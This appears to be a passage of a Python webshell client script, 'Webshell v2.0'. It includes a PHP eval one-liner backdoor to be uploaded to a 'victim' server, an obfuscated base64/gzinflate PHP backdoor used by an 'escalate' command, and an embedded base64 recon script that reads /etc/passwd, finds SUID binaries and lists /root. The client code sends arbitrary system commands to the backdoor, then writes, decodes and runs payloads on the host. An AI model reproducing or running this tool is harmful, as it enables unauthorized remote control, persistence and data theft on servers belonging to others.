S0J2bVlQeWYyTGYzT0RwMThUMFBQVHNhSjFBakpieE5oZDZiT0JCL2NtWk9DWTZnUVU4S1JrRkpG
VFJMS3JmS05VTngKeTRwd3hJenkrTUZPaU16b0RMTTlQSHNyZWttTHFGdExKcGdyL2NOeHh2djJJ
NE1GVUVqQ05mWHZseFA0dDdjRGVMWi82UFQwMXNNZQpSSm1ER0NCc0JyNzlMQ3hqQkk1VlR2dVhx
cHlsdk5lSDdDSnhnNHEvd2o0MlJxNUhsRzhmdzJDajQrVDFTNjBOQ2l6cVNyN052K1lWCkJsYkJY
c2tqejRjckRSd01yclVrVENjeFJ6M2ZSakV6Z3Nra1JYN2NvaVJ1YnV3QXgxSFIzR1NSTllhaEJK
SEkzSjc2d0ZtSExuMzEKV0RwZkQ5U1VKemkzOGduY2k2RjV2UEZubzkrSjR5cENrY0IrWC8rakw0
a2ZtSUxRUXhVZkN0UVRmWDFyYTRhV0YvdXZDVHFMS3JFagpNSXhwamlvNGNrY0VMSVJoMzZYRVlY
T2VKWEdQS3NQTXhPakZxdXFGR1RhNHc5UFZTM0R3ckRHdFpDb0l2cmdwSnZiQU9vVEV2ZFh4Ck84
NzZBbHRhZkVORFMrdk1EV2xyL0ZRRXRyZGNDTUZwdkJMU01hSTBXK2N6TFVweExFc2N4cHNDTjZw
cElaaUErWEJIVWNtWEpCa3cKK3JsQTBPR1lFdElMTURGOFZJTFFsVnlBK0FLWk1BMkJpcVJHTDdW
THlmSUg3dU16citNejM0Wk5rV1VXaTgyMTgwcHY0eXNIM2JCYQpqRjhkRTdzUnovSnNqZDM2QWNU
NFV1Wk8wNnIyUk95bjBoeU4za25JeGtUc0RVbmFRSUl5bjQ3Szg1Q0xjbGtCNHhMWDdsVkxFc1JE
Cm1Oa1E1aEEwUzlPZWJjZUF2Q0NNaytHOTBXeWUwbE9LdUlLRENDeFlBU1RvNldzZTRzR25FMlNH
cjkzakNRQXA0MjA0M0I0TG55akYKOVFEbEhuRFF0dldHa3ZOWkVvTmxpQzVrTVpiZHNxWk1WdFV4
Z2ZUOXhKV2YxMTZxVFltNDdJeVpGOGkzcVR4clN6UWJvNXlmNGZxQQoxV0ZUeDBjWUw3MmdLQnJD
TVhNOU53TWtTcWxyM2RkVkx2UElCN1kyNCt2aXY4c1YrQkJpWGlQMnE0VUp4anRvZ0dSYW9UWklX
VE1MCkl0VDVwekw3b0dYd3RQTXlSeU1XdjF4YmlDMnZ3VjZKOFFyeFFIWDk3Y1VsYVlqbEo0NFNH
c1RSSktGQmFBYnRwZzNxQ0d3ck5VK0sKUGdOaDlMbkRhQXN6RjZMS2RyTlZoYVE4NHhJVWdvL1Bs
N1ZFbjBIc0NzblYwdXM1ZmJVRkhhUDhhVlVoUVVvNjhFSWcyR3FNVXQ0ZwpIU2gwSkVjNkxoT3Bi
WDBmTWovNzFFU042UWVtRlVLWkJKeit5VTRGVkVKOUpva1BDWHV5SE5pOGllNnB2M2t5bGV4aWx5
QVZ2bXJyCnFubWlraGhZYVlkamVqL2xBWVBUN2dOdyt5ZHY3Zm5obUxLenVkL0hxUG1iUE9pVFV3
dGNCMzF5UDQ4Yi93TmU2VUdjMkIzVWlLKzgKUFczU1Q2OVB4ZTRVa1QwWkNLbGhpSXVsR1VsV0Zy
VVBocWxMcjh6cThyZitDMUlIcFBKSEYyZ1lYQ25kWnpFQUdjVEZpbjNSZFFzWApXZkdzTVp4eFFX
Qjg0bXVxV0lta0MvVXhkaXFBbXpxUStQbVN5eCtwaUJ4aUNKQzNOUHZrTlpmRFpQeStrV0ZtOGow
amdsN2NSUTNsCkV3R2tYUHc2NFlrUWdHaXlscm03b21nU0xYdUpud21oTGtnbDVKK1M3MWhHQUNV
RlJmTmY0Y09HRXczakR0SW9rUnI4UlEvb3c0Q3kKL2EwRkovTDNveWlyNWhuMWFHajlBVUMyWnpG
VnpaUGk2STdrK25rMWJjTEQ1aGlpTVAzUENPd2VjODhEcUU2ZzcwZ3U4dnc2emJPVApISFQ5Rmln
UUhlekUybjdodzloR05YY0pFRWlZWGxVRGtPWkJpVVpsRlFFSVpFTGZyR093emluRUhMdmdzbWdY
cGlPa0xYeXNSeDYvCnR0aGJ3emlkcEZiRFlXK2VKVVVuSnljdHd5L1AzR2t3MEpkNGFSOHlvRWU1
aU5jZHNwWWlVcGIzMzhUVHJXaEJTaGJRbmNqNzJwazYKRWViMjQzNzFEenRFbzNUWGZkdzdTNmNs
a2tvSU4veTJ3LzlQWWdVRDN2WlFzeGh6Yi9Wbmp6dzcvcVdNenhGMDZFck5MOVZIa1JMUQpCR1NP
K3hDS09reTZXNEhmZ01Md0VBM0hQeFJMOFhnMkRnNXlMSmZ6bkZTandoVUJROE9lVitpQk1PYW9R
L3F5R3dnMUhpbjgxQk1RCllSK3RlekNvQlRPRCt6RDVyc25MODRxUUc1cUQzQzQzYzlpNlZHZ3VI
RXd2eGZoYU1uM0FodkhvZG5DT0k0OHdwRXZybEd5eW5JRzQKTk5aNkVCVjBORVlWcFVSYnpuNmxX
RXRnakpnZEhJZVpDZ29TSzMxTnB0Ulh5MVlrMUdyZ2pxdmNKWXF6V1BXL2lLb3NBUFA0aS9RSwpF
MkZOa05GdVRDMEhBWVpFTDN5OFl5REpFbTBkQUFnRmtHYkptMm9xd3Q3Y0g2WGgxUHJLQUN4bENC
cGRLUTFuWWRNQytMK3p6eUtoCjE2T1ZIZkpUanlkaUd3ZUNPSjBpaktmMVlndXFxQTUyaEFBVHdK
V01FekIvdUhqcWxHOWVHRFR5aEQ4RzdCSGRrV1VodUpvWGdhOUYKb1dFWkljWTd3Tmg5OE0yYVdD
cndKMlhIQ01qYkw5bGRpaEx6WHNESlcrb09ZNGthRkR3UjhkNzV3RnJuQ01lSkczOEdENk9TT3lP
YwpLWUhsdHNPRkh5V2lZRVF6SEFlOGJkRlFTbDhPbC91UEhIU0VBZjZzVkk0eHlWNCsvN3J3dERY
Um5jVWh4cVdJOFAzRDFoYU10RXlrClFEYmE4S0FYUUh3SVl3d2Z5Z2hTUUY2U0FqS1dBN2xBWndQ
TUNIWVJyZXlLd21MenVqSGRRWXdWeGI4TFNxVlNLV3l6OVVVVG5adHYKM29MdXpRUFVvYVRlbkFv
QzhPY05rNXcrbUxyTDBZRm1nQjlmbUZ5aEkxNWh4T1dIUXNlK3dnbjNYOHBSZmd3WmZUZUZXb1pp
UUUvTApOcElWVkozWk5QOEJ4empqUnNMejBqRnROQkV1RkV2aW9DY2RJakNKNVF0WUc2Qjl6UVR4
R294OGtRdkJIUVVKVlZLYzBMRjVrSlNGClFoeUZxL2NTc0k5NjNWdUFpOElYbmdUR09kRzh1Rklq
SEhER3BjN3V4Vmptb0Q4eGJFQmd4N2h4eWhTZmhtM1VIZXV1ZERjQ3d4VlgKTnVQT0NFOG9ZaS9K
NTVQbDZmd1pyOEZMMGhtUzRYbUhyQ21vRmV5cUNqdHJaSUR0RU9IZ056ZXdGaUlwWXFvUjV6QUlY
M3JuVEdOSQpsSU1ReGZsbllaMFFydVJoTG05OVRaTEUxZnlkZXE5OThlTFIxNS9WaFRpVFFNa2Ux
eG9uMVp2V3EwYTQrbFU5T21pQ29meFpXNVJ3CklDVEdiMjB0bDBIOVpFVGJXVjdIb3Qwd05KdS9m
eVozZmtURmZYK0grSG93Wnk0WlVBUWU5cGdJdmJsWDQ3OGFmdjgrZXlVYzJTMHAKSUhYMjhDYnhu
YUd3VHFDbkg2aGJDUmhRRGk0T2xGVk5CRzluQ1hEajhlMHZsejloU0NjMnQ3N0tuc2pTVC9rMTJW
WERvNDI4SW8wcwppSi84dVI1ZkFVclpsekVvZmlxVDdDWnVVa2ZpNXpGSjg0NGd6MGtuc0lvQnAr
ajBQUEplRlJPUzA4K01ubXlzaThjWWVicjczQ0ZOCllEck5MbkpJV1dJY2xjdkVPb3VmMkRDQmNu
SVpmSDQzanpYNXNOZjNsZWo2NUpuaHp1SFJsRWdWTG50U2IxVXE3MFh4NGFsVnZ5czAKeWV0eFlX
YWM1UkpnV2FxUnBYTC9vYVIzNWRId0VDSzZ2RDRsckNmdUVLUE9RWHVGMHdrZExwM3hKWmkxeGVZ
YWc5UEI1SGVIL0FRPT0iOwpAZXZhbChnemluZmxhdGUoYmFzZTY0X2RlY29kZSgkY29kZSkpKTsK
"""

boxrecon="""IyEgL2Jpbi9iYXNoCiMgQCBhdXRob3IgCQkJOiB5b3Vyc3RydWx5CiMgQCBkZXNjcmlwdGlvbgkJOiBUaGlzIHNjcmlwdCB3aWxsIGZldGNoIHRoZSBmb2xsb3dpbmcKIyAgICAgICAgICAgIAkJICAgLT4gRmlyc3QgY29uZmlybSBhbGwgdGhlIGNvbW1hbmRzIGFyZSBhdmFpbGFibGUKIyAgICAgICAgICAgIAkJICAgLT4gYWxsdXNlcnMgaW4gdGhlIG1hY2hpbmUKIyAgICAgICAgICAgIAkJICAgLT4gc3VpZCBiaW5hcmllcyBpbiB0aGUgbWFjaGluZQojICAgICAgICAgICAgCQkgICAtPiBmb2xkZXJzIHdpdGggd3JpdGFibGUgcGVybWlzc2lvbnMKIyAgICAgICAgICAgIAkJICAgLT4gcGF0aCB2YXJpYWJsZSBvZiB0aGUgbWFjaGluZQojICAgICAgICAgICAgCQkgICAtPiBsaXN0IG9mIGFsbCBiaW5hcmllcwojICAgICAgICAgICAgCQkgICAtPiBtYWNoaW5lIGluZm9ybWF0aW9uCiMgICAgICAgICAgICAJCSAgIC0+IGZpbmQgZmlsZXMgaW4gdGhlIGhvbWUgYW5kIHJvb3QgZGlyZWN0b3J5ICgvcm9vdCkKIyAgICAgICAgICAgIAkJICAgLT4gZmluZCBmaWxlcyBpbiB0aGUgd2ViIGRpcmVjdG9yeSAoL3Zhci93d3cvaHRtbCkKIyAgICAgICAgICAgIAkJICAgLT4gTGlzdCBhbGwgZmlsZXMgaW4gdGhlIGxvY2FsIGhvbWUgZGlyZWN0b3J5CiMgRGVjbGFyaW5nIHZhcmlhYmxlcwpERVBUSD0iMyIKd2hpdGU9IlwwMzNbMG0iCnJlZD0iXDAzM1s5MW0iCmdyZWVuPSJcMDMzWzkybSIKeWVsbG93PSJcMDMzWzkzbSIKZW5kPSIkd2hpdGUiCnN1Y2Nlc3M9IiR7Z3JlZW59IFsrXSAiCmZhaWw9IiR7cmVkfSBbLV0gIgp3YXJuPSIke3llbGxvd30gWyFdICIKZWNobyAtZSAiXHRcdFx0JHN1Y2Nlc3MgU3RhcnRpbmcgQmFzaWMgRW51bWVyYXRpb24gJHdoaXRlIgplY2hvICIiCiMgQ2hlY2tpbmcgd2hldGhlciB0aGUgY29tbWFuZHMgYXJlIGF2YWlsYWJsZQplY2hvIC1lICIkeWVsbG93IFVTRVIgOiAkd2hpdGUgJFVTRVJAJEhPU1ROQU1FIgojIEN1cnJlbnQgV29ya2luZyBEaXJlY3RvcnkKUFdEPWBwd2RgCmVjaG8gLWUgIiR5ZWxsb3cgQ1VSUkVOVCBESVIgOiAkd2hpdGUgJFBXRCIKIyBHZXR0aW5nIHRoZSBwYXRoCmVjaG8gLWUgIiR5ZWxsb3cgUEFUSCA6ICR3aGl0ZSAkUEFUSCIKZWNobyAiICIKIyBGZXRjaGluZyBhbGwgdXNlcnMgaW4gdGhlIG1hY2hpbmUKQUxMVVNFUlM9YGNhdCAvZXRjL3Bhc3N3ZCB8IGF3ayAtRiAiOiIgJ3twcmludCAkMX0nIHx8IGVjaG8gLWUgIiRmYWlsIEZldGNoaW5nIHVzZXJzIGZhaWxlZCAkZW5kImAKZWNobyAtZSAiJHdhcm4gQXZhaWxhYmxlIFVzZXJzICRlbmQiCmVjaG8gLWUgIiRBTExVU0VSUyIKZWNobyAiICIKI0ZldGNoaW5nIGZvbGRlcnMgd2l0aCB3cml0ZSBwZXJtaXNzaW9ucwplY2hvIC1lICIkd2FybiBXcml0YWJsZSBmb2xkZXJzICRlbmQiCmVjaG8gIiAiCiMgRmV0Y2hpbmcgYWxsIHRoZSBiaW5hcmllcyBpbiB0aGUgbWFjaGluZQplY2hvIC1lICIkd2FybiBBbGwgQmluYXJpZXMgJGVuZCIKZWNobyAiICIKIyBGZXRjaGluZyBtYWNoaW5lIGluZm9ybWF0aW9uCk1BQ0hJTkVJTkZPPWBjYXQgL2V0Yy8qLXJlbGVhc2VgCmVjaG8gLWUgIiR3YXJuIE1hY2hpbmUgSW5mb3JtYXRpb24gJGVuZCIKZWNobyAiJE1BQ0hJTkVJTkZPIgplY2hvICIgIgojIEZpbmRpbmcgZmlsZXMgaW4gdGhlIGhvbWUgRGlyZWN0b3J5CkhPTUVESVI9YGZpbmQgL2hvbWUgLW1heGRlcHRoICRERVBUSCAyPi9kZXYvbnVsbGAKZWNobyAtZSAiJHdhcm4gRmlsZXMgaW4gSE9NRURJUiAkZW5kIgplY2hvICIkSE9NRURJUiIKZWNobyAiICIKIyBGaW5kaW5nIGZpbGVzIGluIHRoZSByb290IGRpcmVjdG9yeQpST09URElSPWBmaW5kIC9yb290IDI+L2Rldi9udWxsYAplY2hvIC1lICIkd2FybiBGaWxlcyBpbiBST09URElSICRlbmQiCmVjaG8gIiRST09URElSIgplY2hvICIgIgojIEZpbmRpbmcgZmlsZXMgaW4gd2ViIHJvb3QKV0VCUk9PVD1gZmluZCAvdmFyL3d3dy9odG1sLyAyPi9kZXYvbnVsbGAKZWNobyAtZSAiJHdhcm4gRmlsZXMgaW4gV0VCUk9PVCAkZW5kIgplY2hvICIkV0VCUk9PVCIKZWNobyAiICIKIyBGZXRjaGluZyBzdWlkIGJpbmFyaWVzClNVSUQ9YGZpbmQgLyAtbWF4ZGVwdGggJERFUFRIIC1wZXJtIC11PXMgLXR5cGUgZiAyPi9kZXYvbnVsbGAKZWNobyAtZSAiJHdhcm4gU1VJRCBCSU5BUklFUyAkZW5kIgplY2hvICIkU1VJRCIKZWNobyAiICIKIyBDaGVja2luZyBvdGhlciBORVRTVEFUIGNvbm5lY3Rpb25zL3NlcnZpY2VzCk5FVFNUQVQ9YG5ldHN0YXQgLWxwdG51IDI+L2Rldi9udWxsIHx8IGVjaG8gLWUgIiRmYWlsIE5ldHN0YXQgaXMgbm90IGluc3RhbGxlZCAkZW5kImAKZWNobyAtZSAiJHdhcm4gQ2hlY2tpbmcgbmV0c3RhdCBjb25uZWN0aW9ucyAkZW5kIgplY2hvICIkTkVUU1RBVCIKZWNobyAiICIKZWNobyAtZSAiJHN1Y2Nlc3MgRG9uZSAkZW5kIgo="""
les="""

"""


newpath=""
scriptname=sys.argv[0].split('/')[-1]
uploadstring=r"<?php if(isset($_POST['cmd'])){print_r(@eval($_POST['cmd']));} ?>"

# Color Declarations
white="\033[0m"
red="\033[91m"
green="\033[92m"
yellow="\033[93m"
blue="\033[94m"
fail=f"{red}[ FAIL ] "
success=f"{green} [ OK ] "
warn=f"{yellow} [ ! ] "
progress=f"{blue} [ * ] "
end=f" {white}"

# This is the banner for the program

def logo():	
	logo=f"""{yellow}
	$$\      $$\           $$\                 $$\                 $$\ $$\ 
	$$ | $\  $$ |          $$ |                $$ |                $$ |$$ |
	$$ |$$$\ $$ | $$$$$$\  $$$$$$$\   $$$$$$$\ $$$$$$$\   $$$$$$\  $$ |$$ |
	$$ $$ $$\$$ |$$  __$$\ $$  __$$\ $$  _____|$$  __$$\ $$  __$$\ $$ |$$ |
	$$$$  _$$$$ |$$$$$$$$ |$$ |  $$ |\$$$$$$\  $$ |  $$ |$$$$$$$$ |$$ |$$ |
	$$$  / \$$$ |$$   ____|$$ |  $$ | \____$$\ $$ |  $$ |$$   ____|$$ |$$ |
	$$  /   \$$ |\$$$$$$$\ $$$$$$$  |$$$$$$$  |$$ |  $$ |\$$$$$$$\ $$ |$$ |
	\__/     \__| \_______|\_______/ \_______/ \__|  \__| \_______|\__|\__|
	                                                               
	                                                            version 2.0
	                                               Made with ❤ by yourstruly
	{white}                                                                       
    """   
	print(logo)                                                               

def banner():
	information=f"""
    {yellow}Usage:{white} 
           {scriptname} link_to_the_uploaded_php_backdoor
           {scriptname} http://victim/uploads/my_backdoor.php

    {yellow}Description :{white} 
           To use this webshell,first upload the following one-liner php backdoor to the victim server
            {green}{uploadstring}{white}
    {white}
	"""
	logo()
	print(information)

# Displays basic information about the victim machine
def info():
	logo()
	string=f"""\n

{yellow} User : {white}{user}
{yellow} Host : {white}{gethostname(url)}
{yellow} System : {white}{uname}
{yellow} Current Folder : {white}{pwd}
{yellow} Webshell : {white}{url}
{yellow} Advanced Webshell : {white}{newpath}\n

{yellow} Type {blue}"help"{yellow} for more information. {white}
	"""
	print(string)

# Displays the command available
def help():
	available_commands='clear help escalate exit'.split(' ')
	options="""
Options:
	help       -- Show this help message
	clear      -- Clear the screen
	escalate   -- Deploy a more advanced backdoor with uploader,downloader,file explorer, etc.
	upload     -- Upload the specified filename (To be added)
	download   -- Download the specified file (To be added)

	Deploy Scripts:
	boxrecon   -- Uploads a simple predefined recon script
	les        -- Uploads linux exploit suggester script
	"""
	print(options)

# Sends the command and gets the result
def sendcommand(command):
	payload=f"system('{command} 2>/dev/null');"
	response=session.post(url,data={"cmd":f"{payload}"})
	content=response.text
	try:
		content=content.decode().strip()
	except:
		content=content.strip()
	return content


# Deploys the specified script
def deployscript(filename,payload):
	global newpath
	orig_filename=filename.replace(".sh","")
	filename+=".b64"
	outfile=f'{orig_filename}.sh'
	sendcommand(f"rm {filename}")
	for line in payload.split('\n'):
		print(f'{line.encode()}')
		command=f"echo {line}>>{filename}"
		content=sendcommand(command)

	print(f'{content}\n')
	print(f'{success} New File Written to : {filename}')

	print(f'{success} Unpacking :')
	(sendcommand(f'cat {filename}|base64 -d > {outfile}'))
	(sendcommand(f'chmod +x {outfile}'))
	(sendcommand(f'rm {filename}'))
	(sendcommand(f'sh {outfile}'))
	newpath='/'.join(url.split('/')[:-1])+f"/{outfile}"

# Deploys the advanced shell script
def escalatebackdoor(payload):
	global newpath
	filename=".base64" # Stores the base64 text
	outfile=".backdoor.php" # Actual backdoor
	sendcommand(f"rm {filename} {outfile}")
	for line in payload.split('\n'):
		print(f'{line.encode()}')
		command=f"echo {line}>>{filename}"
		content=sendcommand(command)


	print(f'{content}\n')
	print(f'  	{warn} Make sure you have write permissions to the current folder')
	print(f'{success} New Backdoor Written to file : {filename}')

	print(f'{success} Unpacking :')
	(sendcommand(f'cat {filename}| base64 -d > {outfile}'))
	newpath='/'.join(url.split('/')[:-1])+f"/{outfile}"
	print(f'{success} Cleaning up :')
	sendcommand(f"rm {filename}")
	print(f'  	{yellow}If nothing went wrong the new webshell is at : {white}{newpath}{white}')


def gethostname(url):
	if 'https://' in url:
		hostname=url.split('https://')[1].split('/')[0]
	elif 'http://' in url:
		hostname=url.split('http://')[1].split('/')[0]
	else:
		hostname=""
	return hostname



def checkconnection(user,uname,pwd):
	if len(user.strip()) < 2 or len(uname.strip()) == len(pwd.strip()):
		print(f"No valid user '{user.strip()}' found.Check connection")
		exit()	
	else:
		info()




if(len(arguments) == 2):
	url=arguments[1]
	command=""
	payload=f"system('whoami');"
	user=(session.post(url,data={"cmd":f"{payload}"}).text).strip()
	uname=(session.post(url,data={"cmd":f"system('uname -a');"}).text).strip()
	pwd=(session.post(url,data={"cmd":f"system('pwd');"}).text).strip()

	checkconnection(user,uname,pwd)
	# user=f"{user}@{gethostname(url)}"
	user=f"{red}{user}:{blue}{pwd}{white}"
	exits='q exit'.split(' ')
	while command not in exits:
		command=input(f"{user} $ ").strip()
		if command == 'space' or command == 'clear':
			line="\n"
			print(f"{line * 256}")
			logo()

		elif command == 'help':
			help()

		elif command == 'info':
			info()	

		elif command == 'les':
			deployscript("les",les)

		elif command == 'boxrecon':
			deployscript("boxrecon",boxrecon)

		elif command == 'escalate':
			escalatebackdoor(escalate)

		else:
			content=sendcommand(command)

			print(f'{content}\n')
else:
	banner()




# TODO:
# 	Add colors 
#	Automatically deploy recon tools like : linux exploit suggester 
#	                                        Pinger and Autopinger
#	                                        Box Recon

